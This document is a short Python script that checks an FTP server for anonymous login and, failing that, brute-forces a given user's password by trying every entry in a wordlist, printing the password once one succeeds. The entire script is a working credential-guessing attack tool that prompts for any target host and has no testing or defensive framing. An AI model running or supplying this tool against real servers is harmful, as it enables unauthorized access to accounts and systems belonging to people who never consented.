from ftplib import FTP # a class to implement the ftp client side
from colorama import Fore, init # for printing fancy colors on terminal

# init the console for colors (Windows)
# init()
# hostname or IP address of the FTP server
host = input("Enter the hostname/ip: ")
# username of the FTP server, root as default for linux
username = input("Enter the username: ")

# the file which contains a list of possible password
passwordlist = input("Enter the filename/path of the wordlist: ")

# a function that checks for anonymous login on the target server ftp server
def check_anon_login(host):
    try:
        with FTP(host) as ftp:
            # trying anonymous credentials
            ftp.login()  # user anonymous, passwd anonymous@
            
            # return true if the server allows anonymous login
            return True
    except:
        # otherwise return false
        return False 

# a functiont that brute force the target ftp server
def ftp_buster(host, username, passwordlist):
    # open the passwordlist file and read the passwords
    with open(passwordlist, "r") as passwd_file:
        # iterate over passwords one by one
		# if the password is found, break out of the loop
        for password in passwd_file.readlines():
            password = password.strip()
            with FTP(host=host,timeout=0.1) as ftp:
                try:
                    ftp.login(user=username, passwd=password)
                    print(f"{Fore.GREEN}Password Found: {password}",Fore.RESET)
                    break
                except Exception as e:
                    print(f"Trying...:{password}")
                    continue
                
# check if our ftp server accepts anonymous login, if not we try to brute force the password using the ftp_buster function
if check_anon_login(host=host):
        print("logged In")
else:
    print("Anonymous login failed, Trying to brute force the password")
    ftp_buster(host=host, username=username, passwordlist=passwordlist)